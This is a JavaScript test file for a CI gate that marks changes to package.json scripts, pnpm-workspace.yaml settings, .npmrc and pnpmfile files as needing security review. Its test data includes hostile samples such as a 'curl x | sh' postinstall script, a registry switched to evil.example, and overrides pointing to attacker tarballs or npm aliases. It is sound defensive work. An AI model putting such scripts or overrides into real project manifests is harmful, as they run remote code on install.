// Copyright (c) 2026 Jeffrey Snover. All rights reserved.
// Licensed under the MIT License. See LICENSE file in the project root.

// t/559 (Security p/131#48): package.json and taxonomy-editor/package.json stay unprotected as files (a dependency bump should
// not need the Tech Lead), but their `scripts` decide what `pnpm run lint/test` runs inside required checks. A change under
// `scripts` is a gate change that needs the same --gate-change-review; a dependency-only change is unaffected. One helper
// (scriptsGatePaths) feeds both enqueue-pr.mjs and merge-approval. Unreadable or unparseable on either side counts as a change.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  fetchScriptsGatePaths, gateFileChangeVerdict, packageJsonTargets, scriptsGatePaths, scriptsOfRead,
  workspaceFreeEntriesOf, workspaceFreeValuesOk, WORKSPACE_FREE_ALLOW_NEW_NAMES,
} from './gate-file-change.mjs';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const ROOT_DIR = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..', '..');
import { ruleGateFiles, inputProblems } from './merge-approval-verdict.mjs';
import { readScriptsGatePaths } from './merge-approval-run.mjs';

const pj = (obj) => ({ text: JSON.stringify(obj) });
const E = (filename, previous_filename, status) => ({ filename, ...(previous_filename ? { previous_filename } : {}), ...(status ? { status } : {}) });
const decide = (entries, base, head) => scriptsGatePaths({ entries, reads: { base, head } });

const BASE = { name: 'x', scripts: { build: 'tsc', test: 'vitest' }, dependencies: { a: '^1.0.0' } };

test('t/559 deps-only: a dependency change leaves scripts equal, so the file is not a gate change', () => {
  const head = { ...BASE, dependencies: { a: '^1.0.1', b: '^2.0.0' }, devDependencies: { c: '1.0.0' } };
  assert.deepEqual(decide([E('package.json')], { 'package.json': pj(BASE) }, { 'package.json': pj(head) }), []);
  assert.deepEqual(decide([E('taxonomy-editor/package.json')], { 'taxonomy-editor/package.json': pj(BASE) }, { 'taxonomy-editor/package.json': pj(head) }), []);
});

test('t/559 scripts changed: an edited script body, an added script, a removed script, and an emptied scripts block are each a gate change', () => {
  for (const head of [
    { ...BASE, scripts: { ...BASE.scripts, build: 'node evil.js' } },
    { ...BASE, scripts: { ...BASE.scripts, postinstall: 'curl x | sh' } },
    { ...BASE, scripts: { build: 'tsc' } },
    { ...BASE, scripts: {} },
    (({ scripts, ...rest }) => rest)(BASE),
  ]) {
    assert.deepEqual(decide([E('package.json')], { 'package.json': pj(BASE) }, { 'package.json': pj(head) }), ['package.json'], JSON.stringify(head.scripts));
  }
});

test('t/559: scripts added where there were none is a change; no scripts on either side is not; key order alone is not', () => {
  const noScripts = { name: 'x' };
  assert.deepEqual(decide([E('package.json')], { 'package.json': pj(noScripts) }, { 'package.json': pj({ ...noScripts, scripts: { a: 'b' } }) }), ['package.json']);
  assert.deepEqual(decide([E('package.json')], { 'package.json': pj(noScripts) }, { 'package.json': pj({ ...noScripts, version: '1.0.1' }) }), []);
  assert.deepEqual(decide([E('package.json')], { 'package.json': pj({ scripts: { a: '1', b: '2' } }) }, { 'package.json': pj({ scripts: { b: '2', a: '1' } }) }), [], 'key order is not a change');
});

test('t/559 new and deleted files: a new package.json with scripts, or a deleted one that had them, is a change; without scripts it is not', () => {
  const added = E('lib/x/package.json', undefined, 'added');
  const removed = E('lib/x/package.json', undefined, 'removed');
  assert.deepEqual(decide([added], { 'lib/x/package.json': { missing: true } }, { 'lib/x/package.json': pj({ scripts: { a: 'b' } }) }), ['lib/x/package.json']);
  assert.deepEqual(decide([added], { 'lib/x/package.json': { missing: true } }, { 'lib/x/package.json': pj({ name: 'x' }) }), []);
  assert.deepEqual(decide([removed], { 'lib/x/package.json': pj({ scripts: { a: 'b' } }) }, { 'lib/x/package.json': { missing: true } }), ['lib/x/package.json']);
});

test('t/559 read failure (refused): an error, a missing read entry, or unparseable JSON on either side counts as a change', () => {
  const ok = pj(BASE);
  assert.deepEqual(decide([E('package.json')], { 'package.json': { error: new Error('HTTP 502') } }, { 'package.json': ok }), ['package.json'], 'base read failed');
  assert.deepEqual(decide([E('package.json')], { 'package.json': ok }, { 'package.json': { error: new Error('HTTP 502') } }), ['package.json'], 'head read failed');
  assert.deepEqual(decide([E('package.json')], { 'package.json': ok }, {}), ['package.json'], 'no head read at all');
  assert.deepEqual(decide([E('package.json')], {}, { 'package.json': ok }), ['package.json'], 'no base read at all');
  assert.deepEqual(decide([E('package.json')], { 'package.json': { text: '{ not json' } }, { 'package.json': ok }), ['package.json'], 'base does not parse');
  assert.deepEqual(decide([E('package.json')], { 'package.json': ok }, { 'package.json': { text: '[1,2]' } }), ['package.json'], 'head is not an object');
  assert.deepEqual(decide([E('package.json')], { 'package.json': ok }, { 'package.json': { text: '' } }), ['package.json'], 'head is empty');
});

test('t/559: a rename reads the old path at the base; files that are not package.json are never read or counted', () => {
  assert.deepEqual(decide([E('lib/new/package.json', 'lib/old/package.json')], { 'lib/old/package.json': pj(BASE) }, { 'lib/new/package.json': pj(BASE) }), []);
  assert.deepEqual(decide([E('lib/new/package.json', 'lib/old/package.json')], { 'lib/old/package.json': pj(BASE) }, { 'lib/new/package.json': pj({ ...BASE, scripts: {} }) }), ['lib/new/package.json']);
  assert.deepEqual(packageJsonTargets([E('README.md'), E('package.json.bak'), E('a/package-lock.json'), E('x/package.json')]).map((t) => t.path), ['x/package.json']);
  assert.deepEqual(decide([E('docs/a.md')], {}, {}), []);
});

// ── the verdict both callers feed ──

test('t/559 verdict: a scripts change refuses without a review and releases with a valid Tech Lead or Security review; deps-only is allowed', () => {
  const files = { paths: ['package.json'], listedCount: 1, expectedCount: 1 };
  const none = gateFileChangeVerdict({ files, headSha: 'a'.repeat(40), override: null, scriptsPaths: [] });
  assert.equal(none.allow, true);
  assert.equal(none.reason, 'no_gate_files');
  const refused = gateFileChangeVerdict({ files, headSha: 'a'.repeat(40), override: null, scriptsPaths: ['package.json'] });
  assert.equal(refused.allow, false);
  assert.equal(refused.reason, 'gate_files_no_override');
  assert.deepEqual(refused.gateFiles, ['package.json']);
  const review = { id: 9, user: { login: 'interweave-reviewer[bot]' }, state: 'APPROVED', commit_id: 'a'.repeat(40), body: 'Approved (Security): scripts reviewed' };
  const released = gateFileChangeVerdict({ files, headSha: 'a'.repeat(40), override: { review }, scriptsPaths: ['package.json'], reviewerLogin: 'interweave-reviewer[bot]' });
  assert.equal(released.allow, true);
  assert.equal(released.reason, 'gate_files_overridden');
});

const mpr = (over = {}) => ({
  number: 7, headSha: 'a'.repeat(40), body: 'Tier: T1', headRefName: 'devops/x', files: [{ filename: 'package.json' }], filesTruncated: false,
  scriptsGatePaths: [], reviews: [], comments: [], labels: [], ...over,
});

test('t/559 merge-approval: rule A takes the same scripts paths, so a scripts change fails rule A without a review and a deps-only PR passes it', () => {
  assert.equal(ruleGateFiles(mpr()).ok, true);
  const r = ruleGateFiles(mpr({ scriptsGatePaths: ['package.json'] }));
  assert.equal(r.ok, false);
  assert.match(r.detail, /package\.json/);
});

test('t/559 merge-approval: input without scriptsGatePaths is an input problem, never a pass', () => {
  assert.deepEqual(inputProblems(mpr()), []);
  const { scriptsGatePaths: _drop, ...without } = mpr();
  assert.ok(inputProblems(without).includes('scriptsGatePaths'));
});

// ── the two readers, against fakes ──

function ghFake({ scriptsBase, scriptsHead, baseStatus = 'ok', headStatus = 'ok', compare = 'ok' }) {
  const calls = [];
  const fn = (args) => {
    const joined = args.join(' ');
    calls.push(joined);
    if (joined.includes('/compare/')) {
      if (compare !== 'ok') throw new Error('gh: HTTP 500');
      return JSON.stringify({ sha: 'b'.repeat(40) });
    }
    if (joined.includes('/contents/')) {
      const isBase = joined.includes(`ref=${'b'.repeat(40)}`);
      const status = isBase ? baseStatus : headStatus;
      if (status === 'missing') throw Object.assign(new Error('gh: Not Found (HTTP 404)'), { stderr: 'gh: Not Found (HTTP 404)' });
      if (status === 'error') throw new Error('gh: HTTP 502 Bad Gateway');
      return JSON.stringify({ name: 'x', scripts: isBase ? scriptsBase : scriptsHead });
    }
    throw new Error(`unexpected gh call: ${joined}`);
  };
  fn.calls = calls;
  return fn;
}

test('t/559 enqueue-pr reader: deps-only reads and finds nothing; scripts changed is found; nothing is read when no package.json changed', () => {
  const same = ghFake({ scriptsBase: { a: '1' }, scriptsHead: { a: '1' } });
  assert.deepEqual(fetchScriptsGatePaths('o/r', 'main', 'c'.repeat(40), [E('package.json')], same), { paths: [], error: null });
  const changed = ghFake({ scriptsBase: { a: '1' }, scriptsHead: { a: '2' } });
  assert.deepEqual(fetchScriptsGatePaths('o/r', 'main', 'c'.repeat(40), [E('package.json')], changed).paths, ['package.json']);
  const idle = ghFake({});
  assert.deepEqual(fetchScriptsGatePaths('o/r', 'main', 'c'.repeat(40), [E('docs/a.md')], idle), { paths: [], error: null });
  assert.equal(idle.calls.length, 0, 'no API read when no package.json changed');
});

test('t/559 enqueue-pr reader (refused): a 502 on either side, a failed compare, and a head that is missing but had scripts count as a change', () => {
  const sha = 'c'.repeat(40);
  assert.deepEqual(fetchScriptsGatePaths('o/r', 'main', sha, [E('package.json')], ghFake({ headStatus: 'error', scriptsBase: {} })).paths, ['package.json']);
  assert.deepEqual(fetchScriptsGatePaths('o/r', 'main', sha, [E('package.json')], ghFake({ baseStatus: 'error', scriptsHead: {} })).paths, ['package.json']);
  const noCompare = fetchScriptsGatePaths('o/r', 'main', sha, [E('package.json'), E('lib/a/package.json')], ghFake({ compare: 'fail', scriptsBase: {}, scriptsHead: {} }));
  assert.deepEqual(noCompare.paths, ['package.json', 'lib/a/package.json']);
  assert.ok(noCompare.error, 'the failure is reported to the caller for a WARN');
  assert.deepEqual(fetchScriptsGatePaths('o/r', 'main', sha, [E('package.json', undefined, 'removed')], ghFake({ headStatus: 'missing', scriptsBase: { a: '1' } })).paths, ['package.json'], 'removed, had scripts');
});

function octokitFake({ baseScripts, headScripts, status = {}, compareFails = false }) {
  const calls = [];
  const github = {
    rest: { repos: {
      compareCommitsWithBasehead: async (a) => { calls.push(`compare ${a.basehead}`); if (compareFails) throw Object.assign(new Error('boom'), { status: 500 }); return { data: { merge_base_commit: { sha: 'b'.repeat(40) } } }; },
      getContent: async (a) => {
        calls.push(`content ${a.path}@${a.ref}`);
        const isBase = a.ref === 'b'.repeat(40);
        const st = isBase ? status.base : status.head;
        if (st === 404) throw Object.assign(new Error('Not Found'), { status: 404 });
        if (st === 502) throw Object.assign(new Error('Bad Gateway'), { status: 502 });
        return { data: JSON.stringify({ scripts: isBase ? baseScripts : headScripts }) };
      },
    } },
  };
  github.calls = calls;
  return github;
}
const PR = { base: { ref: 'main' }, head: { sha: 'c'.repeat(40) } };

test('t/559 merge-approval reader: deps-only finds nothing, scripts changed is found, a read failure or failed compare is a change, nothing is read without a package.json', async () => {
  const args = (github) => ({ github, owner: 'o', repo: 'r', pr: PR, files: [E('package.json')] });
  assert.deepEqual(await readScriptsGatePaths(args(octokitFake({ baseScripts: { a: '1' }, headScripts: { a: '1' } }))), []);
  assert.deepEqual(await readScriptsGatePaths(args(octokitFake({ baseScripts: { a: '1' }, headScripts: { a: '2' } }))), ['package.json']);
  assert.deepEqual(await readScriptsGatePaths(args(octokitFake({ baseScripts: {}, headScripts: {}, status: { head: 502 } }))), ['package.json']);
  assert.deepEqual(await readScriptsGatePaths(args(octokitFake({ baseScripts: {}, headScripts: {}, compareFails: true }))), ['package.json']);
  assert.deepEqual(await readScriptsGatePaths({ github: octokitFake({ baseScripts: { a: '1' }, headScripts: {}, status: { head: 404 } }), owner: 'o', repo: 'r', pr: PR, files: [E('package.json', undefined, 'removed')] }), ['package.json'], 'removed, had scripts');
  const idle = octokitFake({});
  assert.deepEqual(await readScriptsGatePaths({ github: idle, owner: 'o', repo: 'r', pr: PR, files: [E('src/a.ts')] }), []);
  assert.equal(idle.calls.length, 0);
});

test('t/559: the two readers agree on the same facts (the callers cannot disagree)', async () => {
  for (const [b, h] of [[{ a: '1' }, { a: '1' }], [{ a: '1' }, { a: '2' }], [{ a: '1' }, undefined], [undefined, { a: '1' }], [undefined, undefined]]) {
    const gh = fetchScriptsGatePaths('o/r', 'main', 'c'.repeat(40), [E('package.json')], ghFake({ scriptsBase: b, scriptsHead: h })).paths;
    const ok = await readScriptsGatePaths({ github: octokitFake({ baseScripts: b, headScripts: h }), owner: 'o', repo: 'r', pr: PR, files: [E('package.json')] });
    assert.deepEqual(gh, ok, JSON.stringify([b, h]));
  }
});

test('t/559: scriptsOfRead on its own (missing = no scripts; unreadable = not ok)', () => {
  assert.deepEqual(scriptsOfRead({ missing: true }), { ok: true, scripts: null });
  assert.deepEqual(scriptsOfRead({ text: '{"a":1}' }), { ok: true, scripts: null });
  assert.deepEqual(scriptsOfRead({ text: '{"scripts":{"a":"b"}}' }), { ok: true, scripts: { a: 'b' } });
  for (const bad of [undefined, null, {}, { error: new Error('x') }, { text: 5 }, { text: 'null' }]) assert.equal(scriptsOfRead(bad).ok, false, JSON.stringify(bad));
});

// ── Security p/131 changes-requested on #5630 ──

test('t/559 fix 1: a head 404 for an ADDED or MODIFIED package.json is an error (a change), never null-versus-null; only a REMOVED file may be missing at head', () => {
  const P = 'lib/x/package.json';
  const noScripts = pj({ name: 'x' });
  // added: the head read 404s on a just-pushed commit: the old code read null vs null and passed
  assert.deepEqual(decide([E(P, undefined, 'added')], { [P]: { missing: true } }, { [P]: { missing: true } }), [P], 'added, head 404');
  assert.deepEqual(decide([E(P, undefined, 'modified')], { [P]: noScripts }, { [P]: { missing: true } }), [P], 'modified, head 404');
  assert.deepEqual(decide([E(P, undefined, 'renamed')], { [P]: noScripts }, { [P]: { missing: true } }), [P], 'renamed, head 404');
  assert.deepEqual(decide([E(P, undefined, undefined)], { [P]: noScripts }, { [P]: { missing: true } }), [P], 'no status, head 404');
  // removed: the head 404 is the legitimate case
  assert.deepEqual(decide([E(P, undefined, 'removed')], { [P]: noScripts }, { [P]: { missing: true } }), [], 'removed, no scripts, head 404: ok');
  // the base side: only an ADDED file may be missing at base
  assert.deepEqual(decide([E(P, undefined, 'added')], { [P]: { missing: true } }, { [P]: noScripts }), [], 'added, base 404: ok');
  assert.deepEqual(decide([E(P, undefined, 'modified')], { [P]: { missing: true } }, { [P]: noScripts }), [P], 'modified, base 404');
  assert.deepEqual(decide([E(P, undefined, 'removed')], { [P]: { missing: true } }, { [P]: { missing: true } }), [P], 'removed, base 404');
});

test('t/559 fix 1 through the readers: a head 404 on an added or modified file is a change; a removed file without scripts is not', async () => {
  const sha = 'c'.repeat(40);
  const gh = (status) => ghFake({ headStatus: 'missing', scriptsBase: undefined, scriptsHead: undefined, baseStatus: status === 'added' ? 'missing' : 'ok' });
  assert.deepEqual(fetchScriptsGatePaths('o/r', 'main', sha, [E('package.json', undefined, 'added')], gh('added')).paths, ['package.json']);
  assert.deepEqual(fetchScriptsGatePaths('o/r', 'main', sha, [E('package.json', undefined, 'modified')], gh('modified')).paths, ['package.json']);
  assert.deepEqual(fetchScriptsGatePaths('o/r', 'main', sha, [E('package.json', undefined, 'removed')], gh('removed')).paths, [], 'removed, no scripts, 404 at head');
  const o = (st) => octokitFake({ baseScripts: undefined, headScripts: undefined, status: { head: 404, base: st === 'added' ? 404 : undefined } });
  const run = (st, github) => readScriptsGatePaths({ github, owner: 'o', repo: 'r', pr: PR, files: [E('package.json', undefined, st)] });
  assert.deepEqual(await run('added', o('added')), ['package.json']);
  assert.deepEqual(await run('modified', o('modified')), ['package.json']);
  assert.deepEqual(await run('removed', o('removed')), []);
});

test('t/559 fix 2: ANY added, modified or removed package.yaml or package.json5 is a gate change, with no read at all', () => {
  for (const status of ['added', 'modified', 'removed', 'renamed']) {
    assert.deepEqual(decide([E('package.yaml', undefined, status)], {}, {}), ['package.yaml'], `package.yaml ${status}`);
    assert.deepEqual(decide([E('taxonomy-editor/package.json5', undefined, status)], {}, {}), ['taxonomy-editor/package.json5'], `package.json5 ${status}`);
  }
  assert.deepEqual(decide([E('a/package.yaml', 'b/package.json')], {}, {}), ['a/package.yaml'], 'a rename to a package.yaml');
  assert.deepEqual(decide([E('b/package.json', 'a/package.yaml')], { 'a/package.yaml': pj({}) }, { 'b/package.json': pj({}) }), ['b/package.json'], 'a rename away from a package.yaml (the old name is a manifest)');
  assert.deepEqual(decide([E('package.yaml.bak'), E('package.yml'), E('docs/package.yaml.md')], {}, {}), [], 'lookalike names are not manifests');
  // and through the readers: nothing is read, the path is still returned
  const idle = ghFake({});
  assert.deepEqual(fetchScriptsGatePaths('o/r', 'main', 'c'.repeat(40), [E('package.yaml', undefined, 'modified')], idle), { paths: ['package.yaml'], error: null });
  assert.equal(idle.calls.length, 0);
});

test('t/559 fix 2: the pnpm-workspace.yaml packages: list is compared; a new workspace member is a gate change, other keys are not', () => {
  const W = 'pnpm-workspace.yaml';
  const yaml = (pkgs, extra = '') => `packages:\n${pkgs.map((p) => `  - '${p}'`).join('\n')}\n${extra}`;
  const wsDecide = (b, h, status = 'modified') => decide([E(W, undefined, status)], { [W]: { text: b } }, { [W]: { text: h } });
  assert.deepEqual(wsDecide(yaml(['taxonomy-editor', 'lib/*']), yaml(['taxonomy-editor', 'lib/*'])), [], 'unchanged');
  assert.deepEqual(wsDecide(yaml(['taxonomy-editor']), yaml(['taxonomy-editor', 'evil/*'])), [W], 'a new member');
  assert.deepEqual(wsDecide(yaml(['taxonomy-editor', 'lib/*']), yaml(['taxonomy-editor'])), [W], 'a removed member');
  assert.deepEqual(wsDecide(yaml(['a', 'b']), yaml(['b', 'a'])), [], 'order alone is not a change');
  assert.deepEqual(wsDecide(yaml(['a'], 'overrides:\n  x: 1.0.0\n'), yaml(['a'], 'overrides:\n  x: 2.0.0\n')), [], 'a change outside packages: is not this rule');
  assert.deepEqual(wsDecide('packages: [a, b]\n', "packages: ['a', 'b', 'c']\n"), [W], 'inline list, a new member');
  assert.deepEqual(wsDecide('packages:\n  - a # comment\n  - "b"\n', 'packages:\n  - a\n  - b\n'), [], 'comments and quotes normalised');
  // fail closed on unreadable
  assert.deepEqual(decide([E(W, undefined, 'modified')], { [W]: { error: new Error('502') } }, { [W]: { text: yaml(['a']) } }), [W], 'base read error');
  assert.deepEqual(decide([E(W, undefined, 'modified')], { [W]: { text: yaml(['a']) } }, { [W]: { error: new Error('502') } }), [W], 'head read error');
  assert.deepEqual(decide([E(W, undefined, 'modified')], { [W]: { text: yaml(['a']) } }, {}), [W], 'no head read');
  assert.deepEqual(wsDecide(yaml(['a']), 'packages:\n  - a\n  not a list item\n'), [W], 'an unrecognised line inside the block');
  assert.deepEqual(wsDecide(yaml(['a']), 'packages: oops\n'), [W], 'a scalar where a list belongs');
  assert.deepEqual(wsDecide(yaml(['a']), 'packages: [a, b\n'), [W], 'an unterminated inline list');
  // the 404 rule applies here too
  assert.deepEqual(decide([E(W, undefined, 'added')], { [W]: { missing: true } }, { [W]: { missing: true } }), [W], 'added, head 404');
  assert.deepEqual(decide([E(W, undefined, 'added')], { [W]: { missing: true } }, { [W]: { text: yaml(['a']) } }), [W], 'a workspace file that did not exist now declares members');
  assert.deepEqual(decide([E(W, undefined, 'removed')], { [W]: { text: yaml(['a']) } }, { [W]: { missing: true } }), [W], 'a removed workspace file that declared members');
});

test('t/559: workspacePackagesOf on its own', async () => {
  const { workspacePackagesOf } = await import('./gate-file-change.mjs');
  assert.deepEqual(workspacePackagesOf('packages:\n  - b\n  - a\n  - a\n'), { ok: true, packages: ['a', 'b'] });
  assert.deepEqual(workspacePackagesOf('catalog:\n  x: 1\n'), { ok: true, packages: null });
  assert.deepEqual(workspacePackagesOf('packages:\n\nnext: 1\n'), { ok: true, packages: [] });
  for (const bad of [undefined, null, 5]) assert.equal(workspacePackagesOf(bad).ok, false);
});

test('t/559: the enqueue reader carries each file\'s status (fetchChangedFiles entries), so a head 404 is judged by it', async () => {
  const { fetchChangedFiles } = await import('./gate-file-change.mjs');
  const gh = (args) => {
    const j = args.join(' ');
    if (j.includes('{changed_files}')) return JSON.stringify({ changed_files: 2 });
    return [JSON.stringify(['package.json', '', 'added']), JSON.stringify(['b/new.json', 'a/old.json', 'renamed'])].join('\n');
  };
  const r = fetchChangedFiles('o/r', 7, gh);
  assert.deepEqual(r.entries, [{ filename: 'package.json', previous_filename: undefined, status: 'added' }, { filename: 'b/new.json', previous_filename: 'a/old.json', status: 'renamed' }]);
  assert.deepEqual(r.paths, ['package.json', 'b/new.json', 'a/old.json']);
});

// ── t/559 follow-up (Security p/131#116): .npmrc / .pnpmfile.cjs at any depth; pnpm-workspace.yaml INVERTED ──

test('t/559 follow-up (a): .npmrc, .pnpmfile.cjs and pnpmfile.cjs are gate files at ANY depth; lookalikes are not', async () => {
  const { isGateFile, CODE_UNDER_TEST, INSTALL_BEHAVIOUR_BASENAMES } = await import('./gate-file-change.mjs');
  assert.deepEqual([...INSTALL_BEHAVIOUR_BASENAMES], ['.npmrc', '.pnpmfile.cjs', 'pnpmfile.cjs']);
  for (const p of ['.npmrc', '.pnpmfile.cjs', 'pnpmfile.cjs', 'taxonomy-editor/.npmrc', 'lib/debate/.pnpmfile.cjs', 'a/b/c/pnpmfile.cjs', './.npmrc']) assert.equal(isGateFile(p), true, p);
  for (const p of ['npmrc', '.npmrc.bak', 'docs/npmrc.md', '.pnpmfile.cjs.txt', 'pnpmfile.js', 'src/.npmrcx', '.npmrc/readme.md']) assert.equal(isGateFile(p), false, p);
  assert.ok(!CODE_UNDER_TEST.includes('.npmrc'), '.npmrc left CODE_UNDER_TEST (a path cannot be both)');
  // and it releases like any other gate file: refused without a review
  const v = gateFileChangeVerdict({ files: { paths: ['taxonomy-editor/.npmrc'], listedCount: 1, expectedCount: 1 }, headSha: 'a'.repeat(40), override: null });
  assert.equal(v.allow, false);
  assert.equal(v.reason, 'gate_files_no_override');
  assert.deepEqual(v.gateFiles, ['taxonomy-editor/.npmrc']);
});

const W2 = 'pnpm-workspace.yaml';
const wsd = (b, h, status = 'modified') => decide([E(W2, undefined, status)], { [W2]: { text: b } }, { [W2]: { text: h } });
const BASE_WS = "packages:\n  - 'taxonomy-editor'\n\noverrides:\n  x: 1.0.0\n\ncatalog:\n  react: 18.0.0\n";

test('t/559 follow-up (b): a change to ANY top-level key other than overrides, catalog and catalogs is a gate change', () => {
  const keys = [
    ['patchedDependencies', 'patchedDependencies:\n  a@1.0.0: patches/a.patch\n', 'patchedDependencies:\n  a@1.0.0: patches/evil.patch\n'],
    ['packageExtensions', 'packageExtensions:\n  a:\n    dependencies:\n      b: 1\n', 'packageExtensions:\n  a:\n    dependencies:\n      evil: 1\n'],
    ['dangerouslyAllowAllBuilds', 'dangerouslyAllowAllBuilds: false\n', 'dangerouslyAllowAllBuilds: true\n'],
    ['verifyDepsBeforeRun', 'verifyDepsBeforeRun: install\n', 'verifyDepsBeforeRun: false\n'],
    ['registry', 'registry: https://registry.npmjs.org/\n', 'registry: https://evil.example/\n'],
    ['ignoreScripts', 'ignoreScripts: true\n', 'ignoreScripts: false\n'],
    ['allowBuilds', 'allowBuilds:\n  esbuild: true\n', 'allowBuilds:\n  esbuild: true\n  evil-pkg: true\n'],
    ['onlyBuiltDependencies', 'onlyBuiltDependencies:\n  - esbuild\n', 'onlyBuiltDependencies:\n  - esbuild\n  - evil-pkg\n'],
    ['pnpmfile', 'pnpmfile: .pnpmfile.cjs\n', 'pnpmfile: tools/hooks.cjs\n'],
    ['hooks', 'hooks:\n  readPackage: a\n', 'hooks:\n  readPackage: b\n'],
  ];
  for (const [name, before, after] of keys) {
    assert.deepEqual(wsd(BASE_WS + before, BASE_WS + after), [W2], `${name} changed`);
  }
});

test('t/559 follow-up (b): a NEW top-level key, or a removed one, is a gate change (the next key pnpm adds is covered unnamed)', () => {
  assert.deepEqual(wsd(BASE_WS, BASE_WS + 'someFutureSetting: true\n'), [W2], 'a new key');
  assert.deepEqual(wsd(BASE_WS + 'ignoreScripts: true\n', BASE_WS), [W2], 'a removed key');
  assert.deepEqual(wsd(BASE_WS, BASE_WS + 'allowBuilds:\n  x: true\n'), [W2], 'a new block key');
});

test('t/559 follow-up (b): changes confined to overrides, catalog and catalogs pass; comments and blank lines are not changes', () => {
  assert.deepEqual(wsd(BASE_WS, BASE_WS.replace('x: 1.0.0', 'x: 2.0.0')), [], 'overrides: a version bump of a name already present');
  assert.deepEqual(wsd(BASE_WS, BASE_WS.replace('react: 18.0.0', 'react: 19.0.0')), [], 'catalog');
  assert.deepEqual(wsd(BASE_WS, BASE_WS + 'catalogs:\n  legacy:\n    react: 17.0.0\n'), [], 'a new catalogs entry with a plain version spec is free (t/806, new names allowed)');
  assert.deepEqual(wsd(BASE_WS + 'catalogs:\n  a:\n    x: 1\n', BASE_WS), [W2], 'catalogs removed with no lockfile change is a gate change (t/806)');
  assert.deepEqual(wsd(BASE_WS, '# a new comment\n' + BASE_WS.replace('overrides:', '\n\n# note\noverrides:')), [], 'comments and blank lines');
  assert.deepEqual(wsd(BASE_WS + 'ignoreScripts: true\n', BASE_WS.replace('x: 1.0.0', 'x: 9.9.9') + 'ignoreScripts: true\n'), [], 'a gated key unchanged beside an override change');
  // the packages: check stays: order and quotes are not changes, a new member is
  assert.deepEqual(wsd("packages:\n  - 'a'\n  - 'b'\n", 'packages:\n  - b\n  - "a"\n'), []);
  assert.deepEqual(wsd("packages:\n  - 'a'\n", "packages:\n  - 'a'\n  - 'evil/*'\n"), [W2]);
});

test('t/559 follow-up (b): an unreadable or unrecognised file is a change (fail closed)', () => {
  for (const bad of ['---\npackages:\n  - a\n', 'packages:\n  - a\n- stray\n', '  indented: first\npackages:\n  - a\n', 'packages:\n  - a\npackages:\n  - b\n', 'just text\n', 'packages: [a\n', 'key with spaces: 1\n']) {
    assert.deepEqual(wsd(BASE_WS, bad), [W2], JSON.stringify(bad.slice(0, 30)));
    assert.deepEqual(wsd(bad, BASE_WS), [W2], `base ${JSON.stringify(bad.slice(0, 30))}`);
  }
  assert.deepEqual(decide([E(W2, undefined, 'modified')], { [W2]: { error: new Error('502') } }, { [W2]: { text: BASE_WS } }), [W2]);
  assert.deepEqual(decide([E(W2, undefined, 'modified')], { [W2]: { text: BASE_WS } }, { [W2]: { text: undefined } }), [W2]);
});

test('t/559 follow-up: workspaceFactsOf on its own', async () => {
  const { workspaceFactsOf, WORKSPACE_FREE_KEYS } = await import('./gate-file-change.mjs');
  assert.deepEqual([...WORKSPACE_FREE_KEYS], ['overrides', 'catalog', 'catalogs']);
  assert.deepEqual(workspaceFactsOf(BASE_WS), { ok: true, fact: { packages: ['taxonomy-editor'] } });
  assert.deepEqual(workspaceFactsOf('ignoreScripts: true\n').fact, { ignoreScripts: 'ignoreScripts: true' });
  assert.deepEqual(workspaceFactsOf('overrides:\n  a: 1\n'), { ok: true, fact: {} });
  assert.equal(workspaceFactsOf(undefined).ok, false);
  assert.equal(workspaceFactsOf(5).ok, false);
});

// ── t/806 (SO p/136#129): overrides / catalog / catalogs values must be plain version specs ──

const WS = 'pnpm-workspace.yaml';
const WS_BASE = "packages:\n  - 'taxonomy-editor'\n\noverrides:\n  axios: \">=1.20.0 <2\"\n  # a comment\n  fast-xml-parser: \">=5.12.0 <5.13.0\"\n  '@azure/msal-node': '>=7.1.0 <8'\n\ncatalog:\n  react: ^18.0.0\n\ncatalogs:\n  legacy:\n    react: 17.0.0\n";
const wsFree = (head, base = WS_BASE) => decide([E(WS, undefined, 'modified')], { [WS]: { text: base } }, { [WS]: { text: head } });
const wsReplace = (from, to) => WS_BASE.replace(from, to);

test('t/806: a version-only bump of names already present is free (overrides, catalog and catalogs)', () => {
  assert.deepEqual(wsFree(wsReplace('>=1.20.0 <2', '>=1.21.0 <2')), []);
  assert.deepEqual(wsFree(wsReplace('>=5.12.0 <5.13.0', '>=5.12.1 <5.13.0')), [], 'a floor raise');
  assert.deepEqual(wsFree(wsReplace('react: ^18.0.0', 'react: ^19.0.0')), [], 'catalog');
  assert.deepEqual(wsFree(wsReplace('react: 17.0.0', 'react: 17.0.2')), [], 'catalogs, two levels');
  assert.deepEqual(wsFree(wsReplace("'>=7.1.0 <8'", "'>=7.2.0 <8'")), [], 'a quoted key and value');
  assert.deepEqual(wsFree(WS_BASE.replace('  # a comment\n', '  # another comment\n')), [], 'a comment change');
  assert.deepEqual(decide([E(WS, undefined, 'modified'), E('pnpm-lock.yaml', undefined, 'modified')], { [WS]: { text: WS_BASE }, 'pnpm-lock.yaml': { text: 'a' } }, { [WS]: { text: wsReplace('  axios: ">=1.20.0 <2"\n', '') }, 'pnpm-lock.yaml': { text: 'b' } }), [], 'a REMOVED override with a lockfile change');
});

test('t/806: an override or catalog value that is a URL, an npm: alias, a git spec, file:, link:, workspace:, a $ref or "-" is a gate change', () => {
  for (const bad of [
    'https://evil.example/axios-1.0.0.tgz', 'http://evil.example/a.tgz', 'npm:evil-axios@1.0.0', 'git+https://github.com/x/axios.git#abc', 'git://github.com/x/y.git',
    'github:x/axios', 'file:../local-axios', 'link:../local-axios', 'workspace:*', '$axios', '-', 'latest', '*', 'x/y', '1.0.0 || https://evil.example', '1.0.0@evil',
  ]) {
    assert.deepEqual(wsFree(wsReplace('>=1.20.0 <2', bad)), [WS], `overrides axios -> ${bad}`);
    assert.deepEqual(wsFree(wsReplace('react: ^18.0.0', `react: "${bad}"`)), [WS], `catalog react -> ${bad}`);
    assert.deepEqual(wsFree(wsReplace('react: 17.0.0', `react: '${bad}'`)), [WS], `catalogs legacy react -> ${bad}`);
  }
  // an unchanged URL already in the file is not a CHANGE (only changed or new values are judged)
  const withUrl = WS_BASE.replace('overrides:\n', 'overrides:\n  odd: https://old.example/odd.tgz\n');
  assert.deepEqual(wsFree(withUrl.replace('>=1.20.0 <2', '>=1.21.0 <2'), withUrl), [], 'an existing value that is not touched');
